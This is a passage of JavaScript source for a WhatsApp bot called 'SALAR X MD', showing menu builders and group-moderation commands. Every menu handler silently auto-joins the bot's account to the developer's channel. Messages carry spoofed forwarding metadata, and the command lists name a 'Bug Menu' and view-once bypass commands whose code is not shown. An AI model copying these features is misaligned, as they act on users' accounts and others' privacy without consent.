  console.log("❌ ERROR MENU:", err);

  // 🔻 fallback biar gak kosong
  await devtrust.sendMessage(from, {
    text: "Menu gagal load, coba lagi atau update WhatsApp."
  });
}
            }
                break;

            case 'voicemenu':
            case '𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗voice': {
            autoJoinGroup(devtrust, "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r").catch(err => console.error("Failed to auto join:", err));
                await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });

                const menuImages = [
                    'https://i.ibb.co/rGr4bWW8/image1.jpg',
                    'https://i.ibb.co/rGr4bWW8/image1.jpg'
                ];

                const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
                const uptime = formatUptime(process.uptime());
                const totalMem = os.totalmem();
                const freeMem = os.freemem();
                const platform = os.platform();
                const date = getLagosTime();
                const readmore = String.fromCharCode(8206).repeat(4001);
                const ramInfo = formatRam(totalMem, freeMem);
                const moodEmoji = getMoodEmoji();
                const totalCommands = countCommands();
                const hour = date.getHours();
                let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';

                // Get professional features
                const ownerName = getOwnerName();
                const botVersion = getBotVersion();
                const botMode = getBotMode();
                const currentDateTime = getCurrentDateTime();

                // ALPHABETICAL SECTIONS
                const menuText = `
┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender?.split('@')?.[0] || 'User'}
┃ \`𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
📱 *Pair 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗:* _https://t.me/rajumdxbug_bot
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐕𝐎𝐈𝐂𝐄* ◆━━┓
│❖ ${prefix}bass
│❖ ${prefix}blown
│❖ ${prefix}deep
│❖ ${prefix}earrape
│❖ ${prefix}fast
│❖ ${prefix}fat
│❖ ${prefix}gtts
│❖ ${prefix}nightcore
│❖ ${prefix}reverse
│❖ ${prefix}robot
│❖ ${prefix}say
│❖ ${prefix}slow
│❖ ${prefix}smooth
│❖ ${prefix}squirrel
│❖ ${prefix}tts
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by 𝗦𝗔𝗟𝗔𝗥 𝗞𝗜𝗡𝗚 👑* | © 2026
`;

try {
  const media = await prepareWAMessageMedia(
    { image: { url: randomImage } },
    { upload: devtrust.waUploadToServer }
  );

  await devtrust.relayMessage(from, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            ...media
          },
          body: {
            text: menuText
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  sections: [
                    {
                      title: "✨ 𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨",
                      rows: [
                        { title: "🤖 AI Menu", rowId: `.aimenu` },
                        { title: "🎨 Anime Menu", rowId: `.animemenu` },
                        { title: "🐛 Bug Menu", rowId: `.bugmenu` },
                        { title: "📥 Download Menu", rowId: `.downloadmenu` },
                        { title: "🎮 Fun Menu", rowId: `.funmenu` },
                        { title: "🎲 Game Menu", rowId: `.gamemenu` },
                        { title: "👥 Group Menu", rowId: `.groupmenu` },
                        { title: "🏷️ Logo Menu", rowId: `.logomenu` },
                        { title: "👑 Owner Menu", rowId: `.ownermenu` },
                        { title: "🏷️ Sticker Menu", rowId: `.stickermenu` },
                        { title: "🔧 Tools Menu", rowId: `.toolsmenu` },
                        { title: "🎙️ Voice Menu", rowId: `.voicemenu` },
                        { title: "📦 Other Menu", rowId: `.othermenu` }
                      ]
                    }
                  ]
                })
              },
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "📢 CHANNEL",
                  url: "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r"
                })
              }
            ]
          },
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363427254972269@newsletter",
              newsletterName: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              serverMessageId: -1
            },
            externalAdReply: {
              title: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              body: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              thumbnailUrl: randomImage,
              sourceUrl: "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }
      }
    }
  }, {});

} catch (err) {
  console.log("❌ ERROR MENU:", err);

  // 🔻 fallback biar gak kosong
  await devtrust.sendMessage(from, {
    text: "Menu gagal load, coba lagi atau update WhatsApp."
  });
}
            }
                break;

            case 'othermenu':
            case '𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗other': {
            autoJoinGroup(devtrust, "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r").catch(err => console.error("Failed to auto join:", err));
                await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });

                const menuImages = [
                    'https://i.ibb.co/rGr4bWW8/image1.jpg',
                    'https://i.ibb.co/rGr4bWW8/image1.jpg'
                ];

                const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
                const uptime = formatUptime(process.uptime());
                const totalMem = os.totalmem();
                const freeMem = os.freemem();
                const platform = os.platform();
                const date = getLagosTime();
                const readmore = String.fromCharCode(8206).repeat(4001);
                const ramInfo = formatRam(totalMem, freeMem);
                const moodEmoji = getMoodEmoji();
                const totalCommands = countCommands();
                const hour = date.getHours();
                let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';

                // Get professional features
                const ownerName = getOwnerName();
                const botVersion = getBotVersion();
                const botMode = getBotMode();
                const currentDateTime = getCurrentDateTime();

                // ALPHABETICAL SECTIONS
                const menuText = `
┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender?.split('@')?.[0] || 'User'}
┃ \`𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
📱 *Pair 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗:* _https://t.me/rajumdxbug_bot
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐎𝐓𝐇𝐄𝐑* ◆━━┓
│❖ ${prefix}😭
│❖ ${prefix}account
│❖ ${prefix}alive
│❖ ${prefix}aza
│❖ ${prefix}buy-panel
│❖ ${prefix}cat
│❖ ${prefix}checkmail
│❖ ${prefix}checkmails
│❖ ${prefix}coffee
│❖ ${prefix}del
│❖ ${prefix}delete
│❖ ${prefix}delmail
│❖ ${prefix}delpair
│❖ ${prefix}deltemp
│❖ ${prefix}deltmp
│❖ ${prefix}deletemail
│❖ ${prefix}dog
│❖ ${prefix}download
│❖ ${prefix}fox
│❖ ${prefix}freebot
│❖ ${prefix}gellltbot
│❖ ${prefix}getpp
│❖ ${prefix}git
│❖ ${prefix}idch
│❖ ${prefix}inbox
│❖ ${prefix}jid
│❖ ${prefix}kopi
│❖ ${prefix}listpair
│❖ ${prefix}mode
│❖ ${prefix}newmail
│❖ ${prefix}nsbxmdmfw
│❖ ${prefix}owner
│❖ ${prefix}pair
│❖ ${prefix}panda
│❖ ${prefix}paptt
│❖ ${prefix}ping
│❖ ${prefix}poem
│❖ ${prefix}prog
│❖ ${prefix}progquote
│❖ ${prefix}random-girl
│❖ ${prefix}react-ch
│❖ ${prefix}rch
│❖ ${prefix}react-channel
│❖ ${prefix}reactbcnch
│❖ ${prefix}reademail
│❖ ${prefix}readmail
│❖ ${prefix}readviewonce2
│❖ ${prefix}repo
│❖ ${prefix}runtime
│❖ ${prefix}save
│❖ ${prefix}speed
│❖ ${prefix}svt
│❖ ${prefix}tempmail
│❖ ${prefix}tempmail2
│❖ ${prefix}tempmail-inbox
│❖ ${prefix}test
│❖ ${prefix}tmpmail
│❖ ${prefix}vkfkk
│❖ ${prefix}vv
│❖ ${prefix}vv2
│❖ ${prefix}vvgh
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by 𝗦𝗔𝗟𝗔𝗥 𝗞𝗜𝗡𝗚 👑* | © 2026
`;

try {
  const media = await prepareWAMessageMedia(
    { image: { url: randomImage } },
    { upload: devtrust.waUploadToServer }
  );

  await devtrust.relayMessage(from, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            ...media
          },
          body: {
            text: menuText
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  sections: [
                    {
                      title: "✨ 𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨",
                      rows: [
                        { title: "🤖 AI Menu", rowId: `.aimenu` },
                        { title: "🎨 Anime Menu", rowId: `.animemenu` },
                        { title: "🐛 Bug Menu", rowId: `.bugmenu` },
                        { title: "📥 Download Menu", rowId: `.downloadmenu` },
                        { title: "🎮 Fun Menu", rowId: `.funmenu` },
                        { title: "🎲 Game Menu", rowId: `.gamemenu` },
                        { title: "👥 Group Menu", rowId: `.groupmenu` },
                        { title: "🏷️ Logo Menu", rowId: `.logomenu` },
                        { title: "👑 Owner Menu", rowId: `.ownermenu` },
                        { title: "🏷️ Sticker Menu", rowId: `.stickermenu` },
                        { title: "🔧 Tools Menu", rowId: `.toolsmenu` },
                        { title: "🎙️ Voice Menu", rowId: `.voicemenu` },
                        { title: "📦 Other Menu", rowId: `.othermenu` }
                      ]
                    }
                  ]
                })
              },
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "📢 CHANNEL",
                  url: "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r"
                })
              }
            ]
          },
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363427254972269@newsletter",
              newsletterName: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              serverMessageId: -1
            },
            externalAdReply: {
              title: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              body: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              thumbnailUrl: randomImage,
              sourceUrl: "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }
      }
    }
  }, {});

} catch (err) {
  console.log("❌ ERROR MENU:", err);

  // 🔻 fallback biar gak kosong
  await devtrust.sendMessage(from, {
    text: "Menu gagal load, coba lagi atau update WhatsApp."
  });
}
            }
                break;

            // === Get Your Free Bot Command ===
            case 'getbot':
            case 'gellltbot':
            case 'freebot': {
                let botInfo =
                    `*𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 — Bot Deployment*

Interested in deploying your own WhatsApp bot?
The process is simple and takes less than 2 minutes.

▸ Choose a bot from the available instances:
  • https://t.me/rajumdxbug_bot
  • https://t.me/rajumdxbug_bot

▸ Start the bot and use:
  /connect [your-number]

▸ Your instance will be ready immediately.

Use *${prefix}𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗* to see all menu.`;

                reply(botInfo);
            }
                break;
            case 'test': {
                let botInfo =
                    '*𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 ᴀʟᴡᴀʏs ᴛʜᴇʀᴇ ғᴏʀ ʏᴏᴜ 🚀🔥*'

                reply(botInfo);
            }

                break;

            case 'groupjid':
            case 'gid': {
                if (!m.isGroup) return reply("👥 *Groups only*");
                reply(`📌 *Group JID:*\n\`${m.chat}\``);
            }
                break;

            case 'invite':
            case 'gclink': {
                if (!m.isGroup) return reply("👥 *Groups only*");
                if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");

                try {
                    const code = await devtrust.groupInviteCode(m.chat);
                    const link = `https://chat.whatsapp.com/${code}`;
                    reply(`🔗 *Group Invite Link*\n\n${link}`);
                } catch (e) {
                    reply(`❌ *Cannot get invite link*\n\nReason: This group may have "Only admins can send invite links" enabled.`);
                }
            }
                break;

            // ======================[ 🔇 MUTE/UNMUTE COMMANDS - FIXED ]======================

            case 'muteuser':
            case 'mutemember': {
                if (!m.isGroup) return reply("👥 *Groups only*");
                if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");

                const user = m.mentionedJid[0] || m.quoted?.sender;
                if (!user) return reply("👤 *Mention user to mute*");

                if (user === m.sender) return reply("❌ *You cannot mute yourself*");

                if (isCreator && user === botNumber) return reply("❌ *Cannot mute the bot*");

                if (!global.muted) global.muted = {};
                if (!global.muted[m.chat]) global.muted[m.chat] = [];

                if (global.muted[m.chat].includes(user)) {
                    return reply(`⚠️ *@${user.split('@')[0]} is already muted*\nUse .unmute to unmute`, [user]);
                }

                global.muted[m.chat].push(user);
                saveMutedData(global.muted);  // <-- ADD THIS LINE
                reply(`🔇 *@${user.split('@')[0]} has been muted*`, [user]);
            }
                break;

            case 'unmuteuser':
            case 'unmutemember': {
                if (!m.isGroup) return reply("👥 *Groups only*");
                if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");

                const user = m.mentionedJid[0] || m.quoted?.sender;
                if (!user) return reply("👤 *Mention user to unmute*");

                if (!global.muted) global.muted = {};
                if (!global.muted[m.chat]) global.muted[m.chat] = [];

                if (!global.muted[m.chat].includes(user)) {
                    return reply(`⚠️ *@${user.split('@')[0]} is not muted*`, [user]);
                }

                global.muted[m.chat] = global.muted[m.chat].filter(jid => jid !== user);
                saveMutedData(global.muted);  // <-- ADD THIS LINE
                reply(`🔊 *@${user.split('@')[0]} has been unmuted*`, [user]);
            }
                break;

            // ======================[ 🔗 ANTI-LINK ]======================
            case 'antilink': {
                if (!m.isGroup) return reply("👥 *Groups only*");
                if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");

                if (!args[0]) {
                    // Check if this group has antilink settings
                    const groupSettings = antilinkSettings[m.chat] || { enabled: false, action: 'delete' };
                    const status = groupSettings.enabled ? 'ON ✅' : 'OFF ❌';
                    const action = groupSettings.enabled ? groupSettings.action : '-';

                    return reply(`🔗 *Anti-Link*\n\n` +
                        `📌 *Usage:*\n` +
                        `▸ ${prefix}antilink on - Enable (delete mode)\n` +
                        `▸ ${prefix}antilink delete - Enable delete mode\n` +
                        `▸ ${prefix}antilink kick - Enable kick mode\n` +
                        `▸ ${prefix}antilink off - Disable\n\n` +
                        `⚙️ *Status:* ${status}\n` +
                        `⚙️ *Action:* ${action}\n\n` +
                        `_When enabled, links will be ${groupSettings.action === 'kick' ? 'deleted and user kicked' : 'deleted'}_`);
                }

                // Handle ON command (default to delete mode)
                if (args[0].toLowerCase() === 'on') {
                    antilinkSettings[m.chat] = { enabled: true, action: 'delete' };
                    saveAntilinkSettings(antilinkSettings);
                    reply(`✅ *Anti-Link enabled (Delete mode)*\nLinks will be deleted automatically.`);
                }
                // Handle DELETE mode
                else if (args[0].toLowerCase() === 'delete') {
                    antilinkSettings[m.chat] = { enabled: true, action: 'delete' };
                    saveAntilinkSettings(antilinkSettings);
                    reply(`✅ *Anti-Link set to DELETE mode*\nLinks will be deleted.`);
                }
                // Handle KICK mode
                else if (args[0].toLowerCase() === 'kick') {
                    antilinkSettings[m.chat] = { enabled: true, action: 'kick' };
                    saveAntilinkSettings(antilinkSettings);
                    reply(`✅ *Anti-Link set to KICK mode*\nUsers who post links will be kicked.`);
                }
                // Handle OFF
                else if (args[0].toLowerCase() === 'off') {
                    if (antilinkSettings[m.chat]) {
                        antilinkSettings[m.chat].enabled = false;
                        saveAntilinkSettings(antilinkSettings);
                        reply(`❌ *Anti-Link disabled for this group*`);
                    } else {
                        reply(`⚠️ *Anti-Link is already disabled*`);
                    }
                }
                else {
                    reply(`❌ *Invalid option. Use: on, delete, kick, or off*`);
                }
            }
                break;

            // ======================[ 🔍 WHOIS ]======================
            case 'whois':
            case 'profile': {
                const user = m.mentionedJid[0] || m.quoted?.sender || m.sender;

                let pp;
                try {
                    pp = await devtrust.profilePictureUrl(user, 'image');
                } catch {
                    pp = 'https://i.ibb.co/rGr4bWW8/image1.jpg';
                }

                let name = await devtrust.getName(user);
                let about = await devtrust.fetchStatus(user).catch(() => ({ status: 'No bio' }));

                await devtrust.sendMessage(m.chat, addNewsletterContext({
                    image: { url: pp },
                    caption: `👤 *User Profile*\n\n` +
                        `📛 *Name:* ${name}\n` +
                        `📱 *Number:* ${user.split('@')[0]}\n` +
                        `📝 *Bio:* ${about.status || 'No bio'}\n` +
                        `🆔 *JID:* ${user}`
                }), { quoted: m });
            }
                break;

            // ======================[ 👥 TOTAL MEMBERS ]======================
            case 'totalmembers':
            case 'members': {
                if (!m.isGroup) return reply("👥 *Groups only*");

                const groupMetadata = await devtrust.groupMetadata(m.chat).catch(() => null);
                const total = groupMetadata?.participants?.length || 0;
                const admins = groupMetadata?.participants?.filter(p => p.admin).length;

                reply(`👥 *Group Members*\n\n` +
                    `📊 *Total:* ${total}\n` +
                    `👑 *Admins:* ${admins}\n` +
                    `👤 *Members:* ${total - admins}`);
            }
                break;

            // ======================[ 🔗 REVOKE LINK ]======================
            case 'revoke':
            case 'revokelink': {
                if (!m.isGroup) return reply("👥 *Groups only*");
                if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");

                await devtrust.groupRevokeInvite(m.chat);
                const code = await devtrust.groupInviteCode(m.chat);
                reply(`✅ *Group link reset*\n🔗 https://chat.whatsapp.com/${code}`);
            }
                break;


            // ======================[ 🏷️ ANTI-TAG ]======================
            case 'antitag': {
                if (!m.isGroup) return reply("👥 *Groups only*");
                if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");

                if (!args[0]) {
                    const config = getSetting(m.chat, "antitag", { enabled: false, action: 'delete' });
                    return reply(`🏷️ *Anti-Tag*\n\n` +
                        `📌 *Usage:*\n` +
                        `▸ .antitag on - Enable (delete mode)\n` +
                        `▸ .antitag delete - Enable delete mode\n` +
                        `▸ .antitag kick - Enable kick mode\n` +
                        `▸ .antitag off - Disable\n\n` +
                        `⚙️ *Status:* ${config.enabled ? 'ON ✅' : 'OFF ❌'}\n` +
                        `⚙️ *Action:* ${config.enabled ? config.action : '-'}`);
                }

                if (args[0] === 'on' || args[0] === 'delete') {
                    setSetting(m.chat, "antitag", { enabled: true, action: 'delete' });
                    reply(`✅ *Anti-Tag enabled (Delete mode)*\nMass tagging will be deleted`);
                }
                else if (args[0] === 'kick') {
                    setSetting(m.chat, "antitag", { enabled: true, action: 'kick' });
                    reply(`✅ *Anti-Tag enabled (Kick mode)*\nUsers who mass tag will be kicked`);
                }
                else if (args[0] === 'off') {
                    setSetting(m.chat, "antitag", { enabled: false, action: 'delete' });
                    reply(`❌ *Anti-Tag disabled*`);
                }
            }
                break;

            // ======================[ 🚫 ANTI-SPAM ]======================
            case 'antispam': {
                if (!m.isGroup) return reply("👥 *Groups only*");
                if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");

                if (!args[0]) {
                    const config = getSetting(m.chat, "antispam", { enabled: false, action: 'delete' });
                    return reply(`🚫 *Anti-Spam*\n\n` +
                        `📌 *Usage:*\n` +
                        `▸ .antispam on - Enable (delete mode)\n` +
                        `▸ .antispam delete - Enable delete mode\n` +
                        `▸ .antispam kick - Enable kick mode\n` +
                        `▸ .antispam off - Disable\n\n` +
                        `⚙️ *Status:* ${config.enabled ? 'ON ✅' : 'OFF ❌'}\n` +
                        `⚙️ *Action:* ${config.enabled ? config.action : '-'}`);
                }

                if (args[0] === 'on' || args[0] === 'delete') {
                    setSetting(m.chat, "antispam", { enabled: true, action: 'delete' });
                    reply(`✅ *Anti-Spam enabled (Delete mode)*\nSpam messages will be deleted`);
                }
                else if (args[0] === 'kick') {
                    setSetting(m.chat, "antispam", { enabled: true, action: 'kick' });
                    reply(`✅ *Anti-Spam enabled (Kick mode)*\nUsers who spam will be kicked`);
                }
                else if (args[0] === 'off') {
                    setSetting(m.chat, "antispam", { enabled: false, action: 'delete' });
                    reply(`❌ *Anti-Spam disabled*`);
                }
            }
                break;

            // ======================[ 🤖 ANTI-BOT ]======================
            case 'antibot': {
                if (!m.isGroup) return reply("👥 *Groups only*");
                if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");

                if (!args[0]) {
                    const config = getSetting(m.chat, "antibot", { enabled: false, action: 'delete' });
                    return reply(`🤖 *Anti-Bot*\n\n` +
                        `📌 *Usage:*\n` +
                        `▸ .antibot on - Enable (delete mode)\n` +
                        `▸ .antibot delete - Enable delete mode\n` +
                        `▸ .antibot kick - Enable kick mode\n` +
                        `▸ .antibot off - Disable\n\n` +
                        `⚙️ *Status:* ${config.enabled ? 'ON ✅' : 'OFF ❌'}\n` +
                        `⚙️ *Action:* ${config.enabled ? config.action : '-'}`);
                }

                if (args[0] === 'on' || args[0] === 'delete') {
                    setSetting(m.chat, "antibot", { enabled: true, action: 'delete' });
                    reply(`✅ *Anti-Bot enabled (Delete mode)*\nBot messages will be deleted`);
                }
                else if (args[0] === 'kick') {
                    setSetting(m.chat, "antibot", { enabled: true, action: 'kick' });
                    reply(`✅ *Anti-Bot enabled (Kick mode)*\nBots will be kicked`);
                }
                else if (args[0] === 'off') {
                    setSetting(m.chat, "antibot", { enabled: false, action: 'delete' });
                    reply(`❌ *Anti-Bot disabled*`);
                }
            }
                break;

            // ======================[ 💰 ANTI-BEG ]======================
            case 'antibeg': {
                if (!m.isGroup) return reply("👥 *Groups only*");
                if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");

                if (!args[0]) {
                    const config = getSetting(m.chat, "antibeg", { enabled: false, action: 'delete' });
                    return reply(`💰 *Anti-Beg (Nigerian Style)*\n\n` +
                        `📌 *Usage:*\n` +
                        `▸ .antibeg on - Enable (delete mode)\n` +
                        `▸ .antibeg delete - Enable delete mode\n` +
                        `▸ .antibeg kick - Enable kick mode\n` +
                        `▸ .antibeg off - Disable\n\n` +
                        `⚙️ *Status:* ${config.enabled ? 'ON ✅' : 'OFF ❌'}\n` +
                        `⚙️ *Action:* ${config.enabled ? config.action : '-'}\n\n` +
                        `_Detects "send me money", "I dey suffer", etc_`);
                }

                if (args[0] === 'on' || args[0] === 'delete') {
                    setSetting(m.chat, "antibeg", { enabled: true, action: 'delete' });
                    reply(`✅ *Anti-Beg enabled (Delete mode)*\nBegging messages will be deleted`);
                }
                else if (args[0] === 'kick') {
                    setSetting(m.chat, "antibeg", { enabled: true, action: 'kick' });
                    reply(`✅ *Anti-Beg enabled (Kick mode)*\nUsers who beg will be kicked`);
                }
                else if (args[0] === 'off') {
                    setSetting(m.chat, "antibeg", { enabled: false, action: 'delete' });
                    reply(`❌ *Anti-Beg disabled*`);
                }
            }
                break;

            // ======================[ ⚠️ WARN COMMANDS ]======================
            case 'warns':
            case 'checkwarns': {
                if (!m.isGroup) return reply("👥 *Groups only*");

                const user = m.mentionedJid[0] || m.quoted?.sender || m.sender;
                const warnCount = global.warns?.[m.chat]?.[user] || 0;

                reply(`⚠️ *@${user.split('@')[0]} has ${warnCount}/3 warnings*`, [user]);
            }
                break;

            case 'resetwarns': {
                if (!m.isGroup) return reply("👥 *Groups only*");
                if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");

                const user = m.mentionedJid[0] || m.quoted?.sender;
                if (!user) return reply("👤 *Mention user to reset warnings*");

                if (global.warns?.[m.chat]?.[user]) {
                    delete global.warns[m.chat][user];
                    reply(`✅ *Warnings reset for @${user.split('@')[0]}*`, [user]);
                } else {
                    reply(`⚠️ *@${user.split('@')[0]} has no warnings*`, [user]);
                }
            }
                break;

            case 'setname':
            case 'setgcname': {
                if (!m.isGroup) return reply("👥 *Groups only*");
                if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");

                if (!text) return reply(`📝 *Usage:* ${prefix}setname New Group Name`);

                try {
                    await devtrust.groupUpdateSubject(m.chat, text);
                    reply(`✅ *Group name changed to:* ${text}`);
                } catch (e) {
                    reply(`❌ *Failed:* ${e.message}`);
                }
            }
                break;

            case 'setdesc':
            case 'setgcdesc': {
                if (!m.isGroup) return reply("👥 *Groups only*");
                if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");

                if (!text) return reply(`📝 *Usage:* ${prefix}setdesc New group description`);

                try {
                    await devtrust.groupUpdateDescription(m.chat, text);
                    reply(`✅ *Group description updated*`);
                } catch (e) {
                    reply(`❌ *Failed:* ${e.message}`);
                }
            }
                break;

            case 'groupinfo':
            case 'ginfo': {
                if (!m.isGroup) return reply("👥 *Groups only*");

                const metadata = await devtrust.groupMetadata(m.chat).catch(() => null);
                const participants = metadata?.participants || [];
                const admins = participants.filter(p => p.admin);
                const bots = participants.filter(p => p.id.includes('bot') || p.id.includes('lid'));

                const info = `📊 *Group Information*
    
📌 *Name:* ${metadata?.subject}
🆔 *ID:* ${metadata.id}
👑 *Owner:* @${metadata.owner?.split('@')[0] || 'Unknown'}
📅 *Created:* ${new Date(metadata.creation * 1000).toLocaleDateString()}
👥 *Members:* ${participants.length}
👮 *Admins:* ${admins.length}
🤖 *Bots:* ${bots.length}
🔒 *Restrict:* ${metadata.restrict ? 'Yes' : 'No'}
🔐 *Announce:* ${metadata.announce ? 'Yes' : 'No'}`;

                reply(info, metadata.owner ? [metadata.owner] : []);
            }
                break;

            case 'setprefix': {
                if (!isCreator && !isSudo) return reply("🔒 *Owner/Sudo only*");

                if (!args[0]) {
                    return reply(`🔧 *Current prefix:* \`${getUserPrefix(m.sender)}\`\n\nUsage: ${prefix}setprefix [new prefix]\nExample: ${prefix}setprefix !`);
                }

                const newPrefix = args.join(' ');

                if (newPrefix.length > 5) {
                    return reply("❌ *Prefix too long* (max 5 characters)");
                }

                // Save the new prefix for THIS USER ONLY
                setUserPrefix(m.sender, newPrefix);

                // Update the prefix variable for current session
                prefix = newPrefix;

                reply(`✅ *Your prefix changed to* \`${newPrefix}\`\n_Use ${newPrefix}menu to see commands_\n_If you forget, type just "." to see your prefix_`);
            }
                break;

            case 'gcsettings':
            case 'groupsettings': {
                if (!m.isGroup) return reply("👥 *Groups only*");
                if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");

                const metadata = await devtrust.groupMetadata(m.chat).catch(() => null);

                const settings = `⚙️ *Group Settings*
    
🔇 *Announce:* ${metadata.announce ? 'ON (Admins only)' : 'OFF (Everyone)'}
🔒 *Restrict:* ${metadata.restrict ? 'ON (Admins only)' : 'OFF (Everyone)'}
👥 *Approve Mode:* ${metadata.approve ? 'ON' : 'OFF'}
📝 *Ephemeral:* ${metadata.ephemeralDuration ? metadata.ephemeralDuration + ' seconds' : 'OFF'}`;

                reply(settings);
            }
                break;

            case 'setgrouppp':
            case 'setgcpp': {
                if (!m.isGroup) return reply("👥 *Groups only*");
                if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");

                const quoted = m.quoted ? m.quoted : m;
